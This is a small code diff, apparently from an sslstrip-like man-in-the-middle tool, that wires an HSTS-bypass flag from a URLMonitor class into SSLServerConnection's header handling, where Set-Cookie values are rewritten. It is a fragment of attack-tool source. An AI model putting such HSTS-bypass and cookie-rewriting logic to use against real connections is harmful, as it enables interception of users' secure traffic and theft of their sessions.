@@ -19,6 +19,7 @@
 import logging, re, string
 
 from ServerConnection import ServerConnection
+from URLMonitor import URLMonitor
 
 class SSLServerConnection(ServerConnection):
 
@@ -36,6 +37,8 @@ class SSLServerConnection(ServerConnection):
 
     def __init__(self, command, uri, postData, headers, client):
         ServerConnection.__init__(self, command, uri, postData, headers, client)
+        self.urlMonitor = URLMonitor.getInstance()
+        self.hsts       = URLMonitor.getInstance().isHstsBypass()
 
     def getLogLevel(self):
         return logging.INFO
@@ -44,7 +47,7 @@ class SSLServerConnection(ServerConnection):
         return "SECURE POST"
 
     def handleHeader(self, key, value):
-        if ServerConnection.isHsts(self):
+        if self.hsts:
             if (key.lower() == 'set-cookie'):
                 newvalues =[]
                 value = SSLServerConnection.cookieExpression.sub("\g<1>", value)
